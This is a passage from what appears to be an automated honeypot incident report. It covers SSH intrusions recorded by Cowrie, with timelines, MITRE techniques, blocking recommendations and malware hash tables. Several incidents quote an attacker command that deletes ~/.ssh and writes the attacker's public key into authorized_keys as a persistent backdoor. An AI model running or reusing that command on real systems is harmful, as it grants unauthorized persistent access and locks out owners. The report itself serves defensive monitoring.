| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:52:15` | `cowrie.session.connect` |
| `2026-04-13 16:52:15` | `cowrie.client.version` |
| `2026-04-13 16:52:16` | `cowrie.client.kex` |
| `2026-04-13 16:52:16` | `cowrie.login.success` |
| `2026-04-13 16:52:16` | `cowrie.session.params` |
| `2026-04-13 16:52:16` | `cowrie.command.input` |
| `2026-04-13 16:52:16` | `cowrie.command.failed` |
| `2026-04-13 16:52:16` | `cowrie.log.closed` |
| `2026-04-13 16:52:17` | `cowrie.session.params` |
| `2026-04-13 16:52:17` | `cowrie.command.input` |
| `2026-04-13 16:52:17` | `cowrie.session.file_download` |
| `2026-04-13 16:52:17` | `cowrie.log.closed` |
| `2026-04-13 16:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5cd05601f5d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:52 |
| **Last Seen** | 2026-04-13 16:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:52:19` | `cowrie.session.connect` |
| `2026-04-13 16:52:19` | `cowrie.client.version` |
| `2026-04-13 16:52:19` | `cowrie.client.kex` |
| `2026-04-13 16:52:19` | `cowrie.login.success` |
| `2026-04-13 16:52:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a890335578

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:54 |
| **Last Seen** | 2026-04-13 16:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:54:17` | `cowrie.session.connect` |
| `2026-04-13 16:54:17` | `cowrie.client.version` |
| `2026-04-13 16:54:19` | `cowrie.client.kex` |
| `2026-04-13 16:54:20` | `cowrie.login.success` |
| `2026-04-13 16:54:21` | `cowrie.session.params` |
| `2026-04-13 16:54:21` | `cowrie.command.input` |
| `2026-04-13 16:54:21` | `cowrie.command.failed` |
| `2026-04-13 16:54:21` | `cowrie.log.closed` |
| `2026-04-13 16:54:22` | `cowrie.session.params` |
| `2026-04-13 16:54:22` | `cowrie.command.input` |
| `2026-04-13 16:54:22` | `cowrie.session.file_download` |
| `2026-04-13 16:54:22` | `cowrie.log.closed` |
| `2026-04-13 16:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7815b1b20ab1

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:54 |
| **Last Seen** | 2026-04-13 16:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:54:27` | `cowrie.session.connect` |
| `2026-04-13 16:54:27` | `cowrie.client.version` |
| `2026-04-13 16:54:27` | `cowrie.client.kex` |
| `2026-04-13 16:54:28` | `cowrie.login.success` |
| `2026-04-13 16:54:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-609e08f04aaf

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:56 |
| **Last Seen** | 2026-04-13 16:56 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:56:05` | `cowrie.session.connect` |
| `2026-04-13 16:56:05` | `cowrie.client.version` |
| `2026-04-13 16:56:05` | `cowrie.client.kex` |
| `2026-04-13 16:56:06` | `cowrie.login.success` |
| `2026-04-13 16:56:07` | `cowrie.session.params` |
| `2026-04-13 16:56:07` | `cowrie.command.input` |
| `2026-04-13 16:56:07` | `cowrie.command.failed` |
| `2026-04-13 16:56:07` | `cowrie.log.closed` |
| `2026-04-13 16:56:08` | `cowrie.session.params` |
| `2026-04-13 16:56:08` | `cowrie.command.input` |
| `2026-04-13 16:56:09` | `cowrie.session.file_download` |
| `2026-04-13 16:56:09` | `cowrie.log.closed` |
| `2026-04-13 16:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-321ed87f1e6e

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:56 |
| **Last Seen** | 2026-04-13 16:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:56:13` | `cowrie.session.connect` |
| `2026-04-13 16:56:13` | `cowrie.client.version` |
| `2026-04-13 16:56:13` | `cowrie.client.kex` |
| `2026-04-13 16:56:15` | `cowrie.login.success` |
| `2026-04-13 16:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96eaa2fe2469

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:57 |
| **Last Seen** | 2026-04-13 16:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:57:08` | `cowrie.session.connect` |
| `2026-04-13 16:57:08` | `cowrie.client.version` |
| `2026-04-13 16:57:08` | `cowrie.client.kex` |
| `2026-04-13 16:57:08` | `cowrie.login.success` |
| `2026-04-13 16:57:09` | `cowrie.session.params` |
| `2026-04-13 16:57:09` | `cowrie.command.input` |
| `2026-04-13 16:57:09` | `cowrie.command.failed` |
| `2026-04-13 16:57:09` | `cowrie.log.closed` |
| `2026-04-13 16:57:09` | `cowrie.session.params` |
| `2026-04-13 16:57:09` | `cowrie.command.input` |
| `2026-04-13 16:57:09` | `cowrie.session.file_download` |
| `2026-04-13 16:57:09` | `cowrie.log.closed` |
| `2026-04-13 16:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cb66eff733d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:57 |
| **Last Seen** | 2026-04-13 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:57:11` | `cowrie.session.connect` |
| `2026-04-13 16:57:11` | `cowrie.client.version` |
| `2026-04-13 16:57:11` | `cowrie.client.kex` |
| `2026-04-13 16:57:11` | `cowrie.login.success` |
| `2026-04-13 16:57:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef96b5fd3d2b

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:57 |
| **Last Seen** | 2026-04-13 16:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:57:54` | `cowrie.session.connect` |
| `2026-04-13 16:57:54` | `cowrie.client.version` |
| `2026-04-13 16:57:55` | `cowrie.client.kex` |
| `2026-04-13 16:57:56` | `cowrie.login.success` |
| `2026-04-13 16:57:57` | `cowrie.session.params` |
| `2026-04-13 16:57:57` | `cowrie.command.input` |
| `2026-04-13 16:57:57` | `cowrie.command.failed` |
| `2026-04-13 16:57:57` | `cowrie.log.closed` |
| `2026-04-13 16:57:58` | `cowrie.session.params` |
| `2026-04-13 16:57:58` | `cowrie.command.input` |
| `2026-04-13 16:57:58` | `cowrie.session.file_download` |
| `2026-04-13 16:57:58` | `cowrie.log.closed` |
| `2026-04-13 16:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb64d65766f0

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:58 |
| **Last Seen** | 2026-04-13 16:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:58:02` | `cowrie.session.connect` |
| `2026-04-13 16:58:02` | `cowrie.client.version` |
| `2026-04-13 16:58:02` | `cowrie.client.kex` |
| `2026-04-13 16:58:04` | `cowrie.login.success` |
| `2026-04-13 16:58:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47448b2bc0eb

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:58 |
| **Last Seen** | 2026-04-13 16:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:58:43` | `cowrie.session.connect` |
| `2026-04-13 16:58:43` | `cowrie.client.version` |
| `2026-04-13 16:58:43` | `cowrie.client.kex` |
| `2026-04-13 16:58:43` | `cowrie.login.success` |
| `2026-04-13 16:58:43` | `cowrie.session.params` |
| `2026-04-13 16:58:43` | `cowrie.command.input` |
| `2026-04-13 16:58:43` | `cowrie.command.failed` |
| `2026-04-13 16:58:44` | `cowrie.log.closed` |
| `2026-04-13 16:58:44` | `cowrie.session.params` |
| `2026-04-13 16:58:44` | `cowrie.command.input` |
| `2026-04-13 16:58:44` | `cowrie.session.file_download` |
| `2026-04-13 16:58:44` | `cowrie.log.closed` |
| `2026-04-13 16:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e372194054d

| Field | Detail |
|---|---|
| **Source IP** | `101.36.127[.]212` |
| **First Seen** | 2026-04-13 16:58 |
| **Last Seen** | 2026-04-13 16:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:58:46` | `cowrie.session.connect` |
| `2026-04-13 16:58:46` | `cowrie.client.version` |
| `2026-04-13 16:58:46` | `cowrie.client.kex` |
| `2026-04-13 16:58:46` | `cowrie.login.success` |
| `2026-04-13 16:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.127[.]212` to AbuseIPDB if not already reported
- [ ] Block `101.36.127[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2adb44e441d4

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:59 |
| **Last Seen** | 2026-04-13 16:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:59:43` | `cowrie.session.connect` |
| `2026-04-13 16:59:43` | `cowrie.client.version` |
| `2026-04-13 16:59:44` | `cowrie.client.kex` |
| `2026-04-13 16:59:45` | `cowrie.login.success` |
| `2026-04-13 16:59:46` | `cowrie.session.params` |
| `2026-04-13 16:59:46` | `cowrie.command.input` |
| `2026-04-13 16:59:46` | `cowrie.command.failed` |
| `2026-04-13 16:59:46` | `cowrie.log.closed` |
| `2026-04-13 16:59:47` | `cowrie.session.params` |
| `2026-04-13 16:59:47` | `cowrie.command.input` |
| `2026-04-13 16:59:47` | `cowrie.session.file_download` |
| `2026-04-13 16:59:47` | `cowrie.log.closed` |
| `2026-04-13 16:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73d100549020

| Field | Detail |
|---|---|
| **Source IP** | `190.181.27[.]27` |
| **First Seen** | 2026-04-13 16:59 |
| **Last Seen** | 2026-04-13 16:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 16:59:51` | `cowrie.session.connect` |
| `2026-04-13 16:59:51` | `cowrie.client.version` |
| `2026-04-13 16:59:51` | `cowrie.client.kex` |
| `2026-04-13 16:59:52` | `cowrie.login.success` |
| `2026-04-13 16:59:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.181.27[.]27` to AbuseIPDB if not already reported
- [ ] Block `190.181.27[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `118.196.34[.]237` | **27** | 2026-04-13 15:42 | 2026-04-13 16:34 | 43m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.36.127[.]212` | **25** | 2026-04-13 16:19 | 2026-04-13 17:00 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `183.91.11[.]36` | **25** | 2026-04-13 15:42 | 2026-04-13 16:28 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `87.106.46[.]37` | **25** | 2026-04-13 15:41 | 2026-04-13 16:23 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `94.143.141[.]37` | **25** | 2026-04-13 15:38 | 2026-04-13 16:22 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `51.68.65[.]117` | **18** | 2026-04-13 15:15 | 2026-04-13 15:38 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.181.27[.]27` | **9** | 2026-04-13 16:41 | 2026-04-13 16:59 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.111[.]167` | **8** | 2026-04-13 16:21 | 2026-04-13 16:45 | 12m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `171.214.220[.]133` | **5** | 2026-04-13 16:19 | 2026-04-13 16:27 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `13.81.183[.]29` | **4** | 2026-04-13 15:14 | 2026-04-13 15:19 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]54` | **3** | 2026-04-13 16:42 | 2026-04-13 16:51 | 2m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `172.202.118[.]72` | **2** | 2026-04-13 16:16 | 2026-04-13 16:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `120.48.28[.]60` | 1 | 2026-04-13 15:44 | 2026-04-13 15:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `15.204.58[.]181` | 1 | 2026-04-13 16:42 | 2026-04-13 16:42 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.141[.]1` | 1 | 2026-04-13 16:22 | 2026-04-13 16:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.23.133[.]68` | 1 | 2026-04-13 15:15 | 2026-04-13 15:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.249.186[.]9` | 1 | 2026-04-13 15:42 | 2026-04-13 15:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.138.134[.]121` | 1 | 2026-04-13 16:41 | 2026-04-13 16:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 42/100 | 🟡 MEDIUM | **32/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
